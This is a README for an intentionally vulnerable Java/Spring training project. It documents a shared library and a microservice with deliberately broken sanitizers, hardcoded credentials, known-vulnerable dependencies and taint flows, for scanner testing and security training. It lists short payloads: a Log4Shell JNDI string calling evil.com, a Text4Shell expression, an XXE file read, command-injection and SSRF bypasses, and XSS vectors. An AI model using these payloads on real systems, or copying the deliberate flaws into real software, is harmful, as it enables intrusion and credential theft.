# VulnerableApp-dependent

> **Cross-Repository Vulnerability Demonstration Platform**

This is a separate Gradle multi-module project that demonstrates how security vulnerabilities propagate across repository and service boundaries through shared libraries, microservice communication, and transitive dependencies.

> **WARNING: This project contains intentional security vulnerabilities and known-vulnerable dependencies. Do NOT use in production. For security training and scanner testing only.**

---

## Overview

VulnerableApp-dependent consists of two modules:

1. **vulnerable-shared-lib** - A shared Java library containing intentionally broken sanitizers, vulnerable utilities, hardcoded credentials, and known-vulnerable dependencies
2. **vulnerable-service** - A Spring Boot microservice that consumes the shared library and communicates with the parent VulnerableApp, demonstrating how taint flows across service boundaries

### Cross-Repository Vulnerability Patterns Demonstrated

| Pattern | Description | Example |
|---------|-------------|---------|
| **Pattern 1: Broken Sanitizers** | Shared library provides sanitization functions that are bypassable | `SQLParameterizer.sanitize()` strips quotes but misses backslash-quote |
| **Pattern 2: Microservice Taint Relay** | Dependent service forwards user input to parent app, amplifying vulnerabilities | `ProxyController` relays to parent SQLi/SSRF/Command Injection endpoints |
| **Pattern 3: Vulnerable Shared Models** | DTOs with dangerous behavior shared across repos | `CarDTO.readObject()` executes arbitrary commands |
| **Pattern 4: Config/Secrets Leakage** | Hardcoded credentials and weak crypto shared via library | `SharedDatabaseConfig` exposes `admin:hacker` |
| **Pattern 5: Transitive Dependency Poisoning** | Library brings in known-vulnerable dependencies | Log4Shell, Text4Shell, Jackson RCE, SnakeYAML RCE |

---

## Project Structure

```
VulnerableApp-dependent/
├── build.gradle                                          # Root Gradle config (Spring Boot 2.4.5)
├── settings.gradle                                       # Multi-module: shared-lib + service
├── gradle/wrapper/                                       # Gradle wrapper
├── gradlew / gradlew.bat
│
├── vulnerable-shared-lib/                                # SHARED LIBRARY MODULE
│   ├── build.gradle                                      # java-library + maven-publish
│   │                                                     # Vulnerable deps: log4j 2.14.1,
│   │                                                     # commons-text 1.8, jackson 2.9.8,
│   │                                                     # snakeyaml 1.26
│   └── src/main/java/org/sasanlabs/shared/
│       ├── config/
│       │   ├── SharedDatabaseConfig.java                 # Hardcoded credentials (admin:hacker)
│       │   ├── SharedJWTConfig.java                      # Weak HMAC secret, exposed RSA key
│       │   └── SharedCryptoConfig.java                   # DES/ECB/MD5, predictable RNG
│       ├── util/
│       │   ├── JSONHelper.java                           # enableDefaultTyping → RCE
│       │   └── XMLHelper.java                            # XXE + Log4Shell
│       ├── sanitizer/
│       │   ├── InputValidator.java                       # ReDoS + path traversal bypass
│       │   ├── CommandSanitizer.java                     # Misses \n, backtick, $()
│       │   ├── SQLParameterizer.java                     # Quote-strip bypass, string concat
│       │   ├── HTMLSanitizer.java                        # Incomplete tags + Text4Shell
│       │   └── URLValidator.java                         # DNS rebinding, IPv6 bypass
│       └── model/
│           ├── UserDTO.java                              # Password in toString(), timing leak
│           ├── CarDTO.java                               # readObject() → Runtime.exec() RCE
│           └── FileMetadata.java                         # Path traversal in getFullPath()
│
└── vulnerable-service/                                   # DEPENDENT SERVICE MODULE
    ├── build.gradle                                      # Spring Boot app + shared-lib dependency
    └── src/main/
        ├── java/org/sasanlabs/dependent/
        │   ├── DependentApplication.java                 # Spring Boot entry point (port 9091)
        │   ├── config/
        │   │   └── ServiceConfiguration.java             # DataSource, JdbcTemplate, SecureRandom beans
        │   ├── controller/
        │   │   ├── UserController.java                   # JSON RCE, SQLi, credential leak
        │   │   ├── FileProcessorController.java          # Path traversal, ReDoS, taint relay
        │   │   ├── DataAggregatorController.java         # RCE, XXE, Log4Shell, Text4Shell, XSS
        │   │   └── ProxyController.java                  # Open proxy, SSRF/CMDi relay
        │   └── service/
        │       ├── CryptoService.java                    # Weak crypto from shared config
        │       ├── DataProcessingService.java            # Chains all shared sanitizers
        │       └── VulnerableAppClient.java              # HTTP client to parent app
        └── resources/
            ├── application.properties                    # Port 9091, parent URL, H2 config
            ├── schema.sql                                # USERS + AUDIT_LOG table definitions
            └── data.sql                                  # Seed users with MD5 password hashes
```

---

## Module 1: vulnerable-shared-lib

### Purpose
Published as `org.sasanlabs:vulnerable-shared-lib:1.0.0` to `mavenLocal()`. Consumed by both the dependent-service and the parent VulnerableApp's cross-repo vulnerability endpoints.

### Known Vulnerable Dependencies

| Dependency | Version | CVE | CVSS | Impact |
|------------|---------|-----|------|--------|
| `org.apache.logging.log4j:log4j-core` | 2.14.1 | CVE-2021-44228 | 10.0 CRITICAL | RCE via JNDI lookup (Log4Shell) |
| `org.apache.commons:commons-text` | 1.8 | CVE-2022-42889 | 9.8 CRITICAL | RCE via StringSubstitutor (Text4Shell) |
| `com.fasterxml.jackson.core:jackson-databind` | 2.9.8 | CVE-2019-12384 | 8.1 HIGH | RCE via polymorphic deserialization |
| `org.yaml:snakeyaml` | 1.26 | CVE-2022-1471 | 9.8 CRITICAL | RCE via arbitrary constructor call |

---

### Config Classes

#### SharedDatabaseConfig.java
| Member | Value | Vulnerability |
|--------|-------|---------------|
| `ADMIN_USER` | `"admin"` | Hardcoded credential |
| `ADMIN_PASSWORD` | `"hacker"` | Hardcoded credential |
| `APP_USER` | `"application"` | Hardcoded credential |
| `APP_PASSWORD` | `"hacker"` | Hardcoded credential |
| `H2_CONSOLE_ENABLED` | `true` | Exposed admin console |
| `H2_CONSOLE_PATH` | `"/h2-console"` | Accessible database admin |
| `getAdminJdbcUrl()` | Returns URL with embedded creds | Credential leakage in strings |
| `getConnectionInfo()` | Returns password in plaintext | Credential leakage in logs |

#### SharedJWTConfig.java
| Member | Value | Vulnerability |
|--------|-------|---------------|
| `HMAC_SECRET` | `"s3cr3t!!"` | 8-char brute-forceable secret |
| RSA Private Key | Full PEM constant | Source code key exposure |
| RSA Public Key | Full PEM constant | Key material disclosure |
| `ALLOW_NONE_ALGORITHM` | `true` | JWT "none" algorithm attack |
| `TOKEN_EXPIRY_SECONDS` | `31536000` (1 year) | Excessively long token lifetime |
| `VALIDATE_ISSUER` | `false` | No issuer validation |
| `VALIDATE_AUDIENCE` | `false` | No audience validation |

#### SharedCryptoConfig.java
| Member | Value | Vulnerability |
|--------|-------|---------------|
| `DEFAULT_CIPHER_ALGORITHM` | `"DES"` | 56-bit broken cipher |
| `DEFAULT_CIPHER_TRANSFORMATION` | `"DES/ECB/PKCS5Padding"` | ECB mode reveals patterns |
| `DEFAULT_HASH_ALGORITHM` | `"MD5"` | Collision-prone hash |
| `HMAC_ALGORITHM` | `"HmacSHA1"` | Deprecated algorithm |
| `FIXED_SEED` | `12345L` | Predictable SecureRandom |
| `DEFAULT_KEY_SIZE` | `64` | Insufficient key length |
| `DEFAULT_ENCRYPTION_KEY` | `"MyS3cr3t"` | Hardcoded encryption key |
| `DEFAULT_IV` | `{0x00..0x07}` | Static initialization vector |
| `getSecureRandom()` | Seeds with `FIXED_SEED` | Predictable random output |

---

### Utility Classes

#### JSONHelper.java

**Key Functions:**

| Method | Signature | Vulnerability |
|--------|-----------|---------------|
| `createMapper()` | `private static ObjectMapper createMapper()` | Calls `enableDefaultTyping()` - allows polymorphic deserialization |
| `fromJSON()` | `public static <T> T fromJSON(String json, Class<T> clazz)` | Deserializes using vulnerable mapper - **RCE via gadget chains** |
| `toJSON()` | `public static String toJSON(Object obj)` | Serializes objects (exposes internal state) |
| `getMapper()` | `public static ObjectMapper getMapper()` | Exposes misconfigured mapper instance |

**Taint Flow:** User JSON input → `fromJSON()` → `enableDefaultTyping` → jackson-databind 2.9.8 → gadget chain (e.g., `JdbcRowSetImpl` JNDI injection) → **RCE**

**Dependencies:** `jackson-databind:2.9.8` (CVE-2019-12384)

#### XMLHelper.java

**Key Functions:**

| Method | Signature | Vulnerability |
|--------|-----------|---------------|
| `parseXML()` | `public static Document parseXML(String xml)` | No XXE protections (DTD, external entities enabled) |
| `createSAXParser()` | `public static SAXParser createSAXParser()` | XXE-vulnerable SAX parser |
| `logParsingError()` | `public static void logParsingError(String xml, Exception e)` | Logs unfiltered user XML via Log4j → **Log4Shell** |
| `isValidXML()` | `public static boolean isValidXML(String xml)` | Parses + calls `logParsingError` on failure |
| `documentToString()` | `public static String documentToString(Document doc)` | XML output serialization |

**Taint Flow 1 (XXE):** User XML → `parseXML()` → no entity restrictions → `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → **file read / SSRF**

**Taint Flow 2 (Log4Shell):** User XML → parse fails → `logParsingError()` → Log4j 2.14.1 → `${jndi:ldap://evil.com/x}` → **RCE**

**Dependencies:** `log4j-core:2.14.1` (CVE-2021-44228)

---

### Sanitizer Classes

#### SQLParameterizer.java

**Key Functions:**

| Method | Signature | Vulnerability | Bypass |
|--------|-----------|---------------|--------|
| `sanitize()` | `public static String sanitize(String input)` | Strips single quotes only | Backslash-quote `\'` escapes in MySQL |
| `buildWhereClause()` | `public static String buildWhereClause(String col, String val)` | String concatenation after sanitize | Same as `sanitize()` |
| `isNumeric()` | `public static boolean isNumeric(String input)` | Regex `-?[0-9a-fA-FxX.eE+]+` too permissive | Hex `0xff`, scientific `1e10` |
| `buildNumericQuery()` | `public static String buildNumericQuery(String table, String id)` | Concatenates after permissive check | Hex/scientific notation injection |

**Taint Flow:** User input → `sanitize()` or `isNumeric()` → string concatenation → SQL query → **SQL Injection**

#### HTMLSanitizer.java

**Key Functions:**

| Method | Signature | Vulnerability | Bypass |
|--------|-----------|---------------|--------|
| `sanitize()` | `public static String sanitize(String html)` | Blocks `<script\|img\|a\|iframe\|embed\|form>` only | `<svg onload=...>`, `<math>`, `<details ontoggle=...>`, `<object>` |
| `sanitizeTemplate()` | `public static String sanitizeTemplate(String template)` | Uses `StringSubstitutor` (commons-text 1.8) | `${script:javascript:Runtime.exec('cmd')}` → **Text4Shell RCE** |
| `containsHTML()` | `public static boolean containsHTML(String input)` | Naive check for `<` character | HTML entities `&lt;script&gt;` bypass |

**Dependencies:** `commons-text:1.8` (CVE-2022-42889)

#### CommandSanitizer.java

**Key Functions:**

| Method | Signature | Vulnerability | Bypass |
|--------|-----------|---------------|--------|
| `sanitize()` | `public static String sanitize(String input)` | Blocks `;`, `&`, `&&`, `\|\|`, `\|` | Newline `\n`/`%0a`, backtick `` ` ``, subshell `$()` |
| `isValidIPAddress()` | `public static boolean isValidIPAddress(String ip)` | Regex `^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*` (unanchored end) | `127.0.0.1\ncat /etc/passwd` |
| `buildPingCommand()` | `public static String buildPingCommand(String ip)` | Concatenates after bypassable checks | Same as above |

**Taint Flow:** User IP → `sanitize()` → `buildPingCommand()` → `ProcessBuilder` → **OS Command Execution**

#### InputValidator.java

**Key Functions:**

| Method | Signature | Vulnerability | Bypass |
|--------|-----------|---------------|--------|
| `isValidFilename()` | `public static boolean isValidFilename(String name)` | ReDoS-vulnerable regex | Crafted input: `aaa...aaa.` causes backtracking |
| `isValidEmail()` | `public static boolean isValidEmail(String email)` | Nested quantifiers `([a-zA-Z0-9]+[._-]?)*` | `aaa...aaa@` causes catastrophic backtracking |
| `sanitizeFilename()` | `public static String sanitizeFilename(String name)` | Only removes `/` and `\` | URL-encoded `%2e%2e%2f`, null bytes `%00` |
| `matchesPattern()` | `public static boolean matchesPattern(String input, String pattern)` | User-controlled regex | ReDoS with crafted patterns |

#### URLValidator.java

**Key Functions:**

| Method | Signature | Vulnerability | Bypass |
|--------|-----------|---------------|--------|
| `isAllowed()` | `public static boolean isAllowed(String url)` | String-based host comparison only | DNS rebinding, IPv6, octal/decimal IPs |
| `extractValidatedHost()` | `public static String extractValidatedHost(String url)` | Pre-resolution hostname | DNS rebinding (host resolves differently later) |

**Blocked Hosts:** `169.254.169.254`, `metadata.google.internal`, `100.100.100.200`, `localhost`

**Bypasses:**
- IPv6: `::ffff:169.254.169.254`
- Octal: `0251.0376.0251.0376`
- Decimal: `2852039166`
- DNS rebinding: attacker domain that resolves to `169.254.169.254`
- Missing `127.0.0.1` variants

---

### Model Classes

#### UserDTO.java
| Field | Type | Vulnerability |
|-------|------|---------------|
| `id` | `Long` | - |
| `username` | `String` | No input validation (accepts SQLi/XSS) |
| `password` | `String` | Sensitive field in serializable DTO |
| `email` | `String` | No validation |
| `role` | `String` | No validation |
| `toString()` | - | **Includes password** (leaks in logs) |
| `checkPassword()` | - | Timing-unsafe `equals()` comparison |

#### CarDTO.java
| Field | Type | Vulnerability |
|-------|------|---------------|
| `id` | `int` | - |
| `name` | `String` | - |
| `image` | `String` | - |
| `command` | `String` | Executed during deserialization |
| `readObject()` | Custom | **`Runtime.getRuntime().exec(command)`** → RCE |

**Taint Flow:** Attacker-controlled serialized data → Java deserialization → `readObject()` → `Runtime.exec(command)` → **RCE**

#### FileMetadata.java
| Field | Type | Vulnerability |
|-------|------|---------------|
| `filename` | `String` | User-controlled |
| `contentType` | `String` | - |
| `size` | `long` | - |
| `baseDir` | `String` | - |
| `getFullPath()` | - | Returns `baseDir + File.separator + filename` — **path traversal** |
| `hasAllowedExtension()` | - | Uses `contains()` not `endsWith()` — bypass: `evil.png.html` |

---

## Module 2: vulnerable-service

### Purpose
Spring Boot application (port 9091, context path `/DependentService`) that consumes `vulnerable-shared-lib` and communicates with the parent VulnerableApp at `http://localhost:9090/VulnerableApp`.

### Configuration

#### application.properties
| Property | Value | Note |
|----------|-------|------|
| `server.port` | `9091` | Separate from parent (9090) |
| `server.servlet.context-path` | `/DependentService` | Service base path |
| `vulnerableapp.base-url` | `http://localhost:9090/VulnerableApp` | Parent app URL |
| `spring.datasource.username` | `admin` | Hardcoded H2 credential |
| `spring.datasource.password` | `hacker` | Hardcoded H2 credential |
| `spring.h2.console.enabled` | `true` | Exposed admin console |
| `spring.servlet.multipart.max-file-size` | `-1` | **No file size limit** (resource exhaustion) |

#### ServiceConfiguration.java
| Bean | Source | Vulnerability |
|------|--------|---------------|
| `DataSource` | `SharedDatabaseConfig` credentials | Hardcoded `admin:hacker` |
| `JdbcTemplate` | DataSource | Inherits credential leak |
| `SecureRandom` | `SharedCryptoConfig.getSecureRandom()` | Predictable (fixed seed 12345) |

#### Database (schema.sql + data.sql)
| Table | Columns | Note |
|-------|---------|------|
| `USERS` | id, username, password_hash, email, role | Seeded with MD5 hashes |
| `AUDIT_LOG` | id, action, details, timestamp | Audit trail |

---

### Controllers

#### UserController.java (`/api/users`)

| Endpoint | Method | Dependencies | Taint Flow | Vulnerability |
|----------|--------|-------------|------------|---------------|
| `/` | POST | `JSONHelper.fromJSON()`, `CryptoService` | JSON body → `fromJSON()` (enableDefaultTyping) → UserDTO (no validation) → MD5 hash → string concat SQL | **RCE** (jackson deserialization), **SQLi** (concat), **Weak Crypto** (MD5) |
| `/search` | GET | `DataProcessingService.searchUsers()`, `SQLParameterizer` | Query param → `SQLParameterizer.sanitize()` (bypassable) → SQL query | **SQL Injection** (backslash-quote bypass) |
| `/dbinfo` | GET | `SharedDatabaseConfig` | Direct return of config constants | **Credential Disclosure** (admin:hacker) |
| `/encrypt` | POST | `CryptoService.encrypt()` | User data → DES/ECB encryption | **Weak Cryptography** |

#### FileProcessorController.java (`/api/files`)

| Endpoint | Method | Dependencies | Taint Flow | Vulnerability |
|----------|--------|-------------|------------|---------------|
| `/upload` | POST | `InputValidator`, `FileMetadata` | Filename → `isValidFilename()` (ReDoS/bypass) → `getFullPath()` (traversal) → file write | **Path Traversal**, **ReDoS** |
| `/relay` | POST | `VulnerableAppClient.uploadFile()` | File → relay to parent upload endpoint | **Taint Relay** to parent |
| `/read` | GET | `FileMetadata` | Filename → `getFullPath()` (traversal) → file read | **Path Traversal** (read) |

#### DataAggregatorController.java (`/api/aggregate`)

| Endpoint | Method | Dependencies | Taint Flow | Vulnerability |
|----------|--------|-------------|------------|---------------|
| `/comments` | GET | `VulnerableAppClient`, `HTMLSanitizer` | Fetch XSS from parent → `sanitize()` (incomplete) → HTML response | **Reverse Taint XSS** (stored XSS in parent rendered here) |
| `/car` | GET | `VulnerableAppClient`, `JSONHelper` | Fetch car data → `fromJSON()` (enableDefaultTyping) → object | **RCE** (jackson deserialization) |
| `/render` | POST | `HTMLSanitizer.sanitize()` | User HTML → sanitize (incomplete) → response | **XSS** (svg/math/details tags) |
| `/template` | POST | `HTMLSanitizer.sanitizeTemplate()` | User template → `StringSubstitutor` → response | **Text4Shell RCE** (CVE-2022-42889) |
| `/xml` | POST | `DataProcessingService`, `XMLHelper` | User XML → `parseXML()` (XXE) + `logParsingError()` (Log4Shell) | **XXE** + **Log4Shell RCE** (CVE-2021-44228) |

#### ProxyController.java (`/api/proxy`)

| Endpoint | Method | Dependencies | Taint Flow | Vulnerability |
|----------|--------|-------------|------------|---------------|
| `/forward` | GET | `VulnerableAppClient.get()` | User path → open proxy to parent | **Open Proxy** (amplifies all parent vulns) |
| `/fetch` | GET | `URLValidator`, `VulnerableAppClient` | URL → `isAllowed()` (bypassable) → fetch | **SSRF** (DNS rebinding, IPv6 bypass) |
| `/ping` | GET | `CommandSanitizer`, `VulnerableAppClient` | IP → `sanitize()` (incomplete) → parent ping | **Command Injection Relay** (newline bypass) |
| `/car` | GET | `VulnerableAppClient.queryCar()` | ID → relay to parent SQLi endpoint | **SQL Injection Relay** |

---

### Services

#### VulnerableAppClient.java

HTTP client to parent VulnerableApp at `localhost:9090`. All methods enable **taint relay** (Pattern 2).

| Method | Target Parent Endpoint | Taint Type |
|--------|------------------------|------------|
| `get(path)` | Any path (open proxy) | User-controlled path |
| `post(path, body, type)` | Any path | User-controlled body |
| `uploadFile(path, content, filename)` | File upload endpoints | User file content |
| `queryCar(id, level)` | `/ErrorBasedSQLInjectionVulnerability/{level}?id={id}` | SQL Injection |
| `fetchUrl(url, level)` | `/SSRFVulnerability/{level}?fileurl={url}` | SSRF |
| `ping(ip, level)` | `/CommandInjection/{level}?ipaddress={ip}` | Command Injection |
| `getComments(level)` | `/PersistentXSSInHTMLTagVulnerability/{level}` | XSS (reverse taint) |

#### DataProcessingService.java

Chains all shared library sanitizers — central point where vulnerabilities converge.

| Method | Shared Lib Call | Vulnerability |
|--------|-----------------|---------------|
| `searchUsers(name)` | `SQLParameterizer.sanitize()` → concat SQL | SQL Injection |
| `processForDisplay(html)` | `HTMLSanitizer.sanitize()` | XSS |
| `processTemplate(template)` | `HTMLSanitizer.sanitizeTemplate()` | Text4Shell RCE |
| `processFileUpload(filename)` | `InputValidator.isValidFilename()` → `FileMetadata` | Path Traversal, ReDoS |
| `parseUser(json)` | `JSONHelper.fromJSON()` | Deserialization RCE |
| `validateXML(xml)` | `XMLHelper.isValidXML()` | XXE + Log4Shell |
| `parseXMLContent(xml)` | `XMLHelper.parseXML()` | XXE |

#### CryptoService.java

| Method | Shared Lib Config | Vulnerability |
|--------|-------------------|---------------|
| `encrypt(data)` | `SharedCryptoConfig` → DES/ECB + hardcoded key | Broken cipher, ECB mode, hardcoded key |
| `decrypt(data)` | Same | Same |
| `hashPassword(password)` | `SharedCryptoConfig.getHashAlgorithm()` → MD5 | No salt, collision-prone hash |
| `getJwtSecret()` | `SharedJWTConfig.HMAC_SECRET` → `"s3cr3t!!"` | 8-char brute-forceable secret |

---

## Detailed Taint Flow Designs by Pattern

### Pattern 1 — Broken Sanitizers (Library to App)

These flows show where the shared library's sanitizers are called and why they still allow exploitation:

| Flow | Entry Point | Library Call | Why Still Vulnerable | Bypass Example |
|------|-------------|--------------|---------------------|----------------|
| **SQLi bypass** | `CrossRepoSQLInjection` (VulnerableApp) | `SQLParameterizer.sanitize(id)` | Strips single quotes but not backslash-escaping | `\'` breakout |
| **XSS bypass** | `CrossRepoXSS` (VulnerableApp) | `HTMLSanitizer.sanitize(input)` | Blocks `<script>`, `<img>`, `<a>` but misses others | `<svg onload=...>`, `<details ontoggle=...>` |
| **CMDi bypass** | `CrossRepoCommandInjection` (VulnerableApp) | `CommandSanitizer.sanitize(ip)` | Strips `;`, `&` but misses newline, backtick, `$()` | `127.0.0.1\ncat /etc/passwd` |
| **SSRF bypass** | `CrossRepoSSRF` (VulnerableApp) | `URLValidator.isAllowed(url)` | Validates hostname string but doesn't resolve DNS | DNS rebinding, `0x7f000001`, `[::1]` |
| **Path traversal bypass** | `CrossRepoPathTraversal` (VulnerableApp) | `InputValidator.isValidFilename(name)` | ReDoS-vulnerable regex + doesn't handle `..%2f` or null bytes | `%2e%2e%2f` encoded traversal |

> **Scanner proof value:** Taint enters VulnerableApp controller, crosses JAR boundary into library sanitizer, returns still-tainted, reaches sink (DB/shell/response). Scanner must track taint through the library's return value.

### Pattern 2 — Microservice Taint Relay (Service to App over HTTP)

| Flow | Source (port 9091) | Relay Path | Sink (port 9090) |
|------|--------------------|------------|-------------------|
| **Chained SSRF** | User sends URL to `ProxyController.forward()` | `VulnerableAppClient.fetch("/SSRFVulnerability/LEVEL_1?fileurl=" + url)` | VulnerableApp fetches the URL |
| **Chained SQLi** | User sends id to `DataAggregatorController.getCar()` | `VulnerableAppClient.fetch("/ErrorBasedSQLInjectionVulnerability/LEVEL_1?id=" + id)` | VulnerableApp executes unsanitized SQL |
| **Reverse taint XSS** | `DataAggregatorController.getComments()` fetches persistent XSS data | Service renders response in HTML without escaping | Stored XSS from VulnerableApp executes in dependent service |
| **Command relay** | User sends hostname to `ProxyController.ping()` | `VulnerableApp's CommandInjection/LEVEL_1?ipaddress=` + input | OS command injection via HTTP relay |
| **Upload relay** | User uploads file to `FileProcessorController` | Service forwards multipart to `UnrestrictedFileUpload/LEVEL_1` | Unrestricted file upload via relay |

> **Scanner proof value:** Taint enters Service A, travels over HTTP call, enters Service B at a vulnerable endpoint. Scanner must model inter-service HTTP calls as taint propagation channels.

### Pattern 3 — Shared Vulnerable Data Models (Library to Both Apps)

| Model | Vulnerability | Where It Manifests |
|-------|---------------|-------------------|
| **UserDTO** | No `@NotNull`/`@Size` validation; `toString()` includes password; `equals()` uses timing-unsafe comparison | VulnerableApp uses it for union-based SQLi results; vulnerable-service uses it for user CRUD — both log it (password leak), both accept any input shape |
| **CarDTO** | Implements `Serializable` with custom `readObject()` that calls `Runtime.exec()` if command field is set | If either app deserializes untrusted CarDTO bytes (cache, queue), RCE. Library's `JSONHelper` with `enableDefaultTyping()` enables this via JSON too |
| **FileMetadata** | `getFullPath()` concatenates `baseDir + "/" + filename` with no traversal check | Both apps use this to construct file paths from user-uploaded filenames — path traversal in both |

> **Scanner proof value:** Vulnerable logic lives in the shared library's model classes; both apps import and use them. Scanner must track taint through shared DTO getters/setters across module boundaries.

### Pattern 4 — Configuration/Secrets Leakage (Library to Both Apps)

| Config Class | What Leaks | Impact |
|-------------|------------|--------|
| **SharedDatabaseConfig** | `DB_PASSWORD = "hacker"`, `DB_URL = "jdbc:h2:mem:testdb"`, `ADMIN_USER = "admin"` | Both apps import these — hardcoded credentials detectable by SAST secret scanning |
| **SharedJWTConfig** | `HMAC_SECRET = "s3cr3t!!"` (8 chars, brute-forceable), RSA private key as PEM string constant | JWT signing in both apps uses these — key strength and hardcoded secret findings |
| **SharedCryptoConfig** | `DEFAULT_ALGORITHM = "DES"`, `HASH_ALGORITHM = "MD5"`, `new SecureRandom(FIXED_SEED)` | Weak crypto defaults consumed by both apps — broken encryption, predictable randomness |

> **Scanner proof value:** Secrets and insecure defaults defined in library, consumed in both apps. Scanner must trace constant values across module boundaries to flag hardcoded credentials and weak crypto.

### Pattern 5 — Transitive Dependency Poisoning (Library to Both Apps)

| Vulnerable Dep in Library | CVE | How It's Exercised |
|--------------------------|-----|--------------------|
| `log4j-core:2.14.1` | CVE-2021-44228 (Log4Shell) | `XMLHelper` logs user-supplied XML parsing errors via Log4j — `${jndi:ldap://...}` in XML triggers RCE |
| `commons-text:1.8` | CVE-2022-42889 (Text4Shell) | `HTMLSanitizer` uses `StringSubstitutor` for template expansion — `${script:javascript:...}` triggers code execution |
| `jackson-databind:2.9.8` | CVE-2019-12384 + others | `JSONHelper.enableDefaultTyping()` + old jackson = polymorphic deserialization RCE |
| `snakeyaml:1.26` | CVE-2022-1471 | If either app parses YAML config from user input, arbitrary constructor invocation |

> **Scanner proof value:** VulnerableApp's `build.gradle` doesn't declare these directly — they arrive transitively via `vulnerable-shared-lib`. SCA scanner must resolve the transitive dependency tree across repos to flag them.

---

## Cross-Repo Controller Summary (VulnerableApp New Additions)

| Controller | Levels | Cross-repo Pattern |
|------------|--------|--------------------|
| `CrossRepoSQLInjection` | 3 | Broken `SQLParameterizer` from shared lib |
| `CrossRepoXSS` | 3 | Broken `HTMLSanitizer` + Text4Shell |
| `CrossRepoCommandInjection` | 2 | Broken `CommandSanitizer` |
| `CrossRepoSSRF` | 2 | Broken `URLValidator` (no DNS resolution) |
| `CrossRepoPathTraversal` | 3 | Broken `InputValidator` + `FileMetadata` |
| `CrossRepoDeserialization` | 4 | `JSONHelper` RCE, `XMLHelper` XXE/Log4Shell, config leakage |

All 5 patterns covered: broken sanitizers, microservice taint relay, shared vulnerable models, config/secrets leakage, transitive dependency poisoning.

---

## Cross-Repository Taint Flow Diagram

```
                          User Input (HTTP Request)
                                    |
                    +---------------+---------------+
                    |                               |
            Dependent Service                 Parent VulnerableApp
            (port 9091)                       (port 9090)
                    |                               |
        +-----------+-----------+          +--------+--------+
        |           |           |          |        |        |
    Controllers   Services   Config    Direct    Cross-    Database
        |           |           |       Vulns     Repo       (H2)
        |           |           |                Vulns
        |     DataProcessing    |                  |
        |     Service           |           Shared Library
        |           |           |          (vulnerable-shared-lib)
        |     +-----+-----+    |                  |
        |     |     |     |    |     +------------+------------+
        |     v     v     v    |     |      |      |     |     |
        | SQLParam HTML  XML   | Sanitizers Config Utils Models
        | eterizer Sanit Helper|     |      |      |     |
        |     |    izer   |    |     |      |      |     |
        |     |     |     |    |     v      v      v     v
        |     v     v     v    | Broken  Hardcoded  XXE  RCE
        |   SQLi   XSS  XXE   | Logic   Creds    Log4j Jackson
        |         Text4  Log4  |
        |         Shell  Shell |
        |                      |
        +--- VulnerableAppClient ----> Parent App Endpoints
                    |                       |
              Taint Relay            Vulnerability
              (open proxy,           Exploitation
               SSRF, CMDi,          (SQLi, XSS,
               SQLi relay)           SSRF, etc.)
```

---

## Complete Vulnerability Inventory

### CRITICAL Severity (RCE / Full System Compromise)

| # | Vulnerability | File(s) | CVE | Attack Vector |
|---|---------------|---------|-----|---------------|
| 1 | Log4Shell | `XMLHelper.logParsingError()` + log4j-core 2.14.1 | CVE-2021-44228 | `${jndi:ldap://evil.com/x}` in XML input |
| 2 | Text4Shell | `HTMLSanitizer.sanitizeTemplate()` + commons-text 1.8 | CVE-2022-42889 | `${script:javascript:Runtime.exec('cmd')}` |
| 3 | Jackson Deserialization | `JSONHelper.fromJSON()` + jackson-databind 2.9.8 | CVE-2019-12384 | Polymorphic type with gadget chain |
| 4 | SnakeYAML Constructor | snakeyaml 1.26 (transitive) | CVE-2022-1471 | YAML with arbitrary constructor |
| 5 | CarDTO readObject() RCE | `CarDTO.readObject()` | N/A | Serialized CarDTO with command field |
| 6 | JWT "none" Algorithm | `SharedJWTConfig.ALLOW_NONE_ALGORITHM = true` | N/A | Forge token with "none" algorithm |
| 7 | Exposed RSA Private Key | `SharedJWTConfig` (full PEM in source) | N/A | Sign arbitrary JWT tokens |

### HIGH Severity (Data Breach / System Manipulation)

| # | Vulnerability | File(s) | Attack Vector |
|---|---------------|---------|---------------|
| 8 | SQL Injection | `SQLParameterizer`, `UserController`, `DataProcessingService` | Backslash-quote bypass, hex/scientific notation |
| 9 | Command Injection | `CommandSanitizer`, `ProxyController` | Newline `\n`, backtick, `$()` subshell |
| 10 | XSS (Incomplete Sanitizer) | `HTMLSanitizer`, `DataAggregatorController` | `<svg onload=...>`, `<math>`, `<details>` |
| 11 | XXE (No Protection) | `XMLHelper.parseXML()`, `DataAggregatorController` | External entity declaration |
| 12 | Path Traversal | `FileMetadata.getFullPath()`, `InputValidator`, `FileProcessorController` | `../../etc/passwd`, URL-encoded sequences |
| 13 | SSRF (Validator Bypass) | `URLValidator`, `ProxyController` | DNS rebinding, IPv6, octal IP |
| 14 | Open Proxy | `ProxyController.forward()`, `VulnerableAppClient` | Arbitrary path forwarding |
| 15 | Hardcoded DB Credentials | `SharedDatabaseConfig` (admin:hacker) | `/api/users/dbinfo` endpoint |
| 16 | Weak Cryptography | `SharedCryptoConfig` (DES/ECB/MD5) | Brute force, pattern analysis |
| 17 | Reverse Taint XSS | `DataAggregatorController.getComments()` | Stored XSS from parent rendered unsafely |
| 18 | Microservice Taint Relay | `VulnerableAppClient` (all methods) | Amplifies parent SQLi/CMDi/SSRF |

### MEDIUM Severity (Partial Compromise / Information Disclosure)

| # | Vulnerability | File(s) | Attack Vector |
|---|---------------|---------|---------------|
| 19 | ReDoS | `InputValidator.isValidFilename()`, `isValidEmail()` | Crafted input causing catastrophic backtracking |
| 20 | Timing Side-Channel | `UserDTO.checkPassword()` | Timing analysis of `equals()` comparison |
| 21 | Password in Logs | `UserDTO.toString()` | Password included in string representation |
| 22 | H2 Console Exposed | `application.properties` | Direct SQL execution via `/h2-console` |
| 23 | No File Size Limit | `spring.servlet.multipart.max-file-size=-1` | Resource exhaustion via large uploads |
| 24 | Predictable Random | `SharedCryptoConfig.getSecureRandom()` (seed=12345) | Predict random values |
| 25 | Extension Check Bypass | `FileMetadata.hasAllowedExtension()` | `evil.png.html` passes `contains("png")` |
| 26 | Weak JWT HMAC Secret | `SharedJWTConfig.HMAC_SECRET = "s3cr3t!!"` | Dictionary attack on 8-char secret |
| 27 | MD5 Password Hashing | `CryptoService.hashPassword()`, `data.sql` | Rainbow tables, no salt |

---

## File Dependency Map

### Dependency Flow (What depends on what)

```
Controllers
    ├── UserController
    │   ├── JSONHelper (fromJSON → RCE)
    │   ├── DataProcessingService (searchUsers → SQLi)
    │   ├── CryptoService (hashPassword → MD5, encrypt → DES)
    │   └── SharedDatabaseConfig (getConnectionInfo → cred leak)
    │
    ├── FileProcessorController
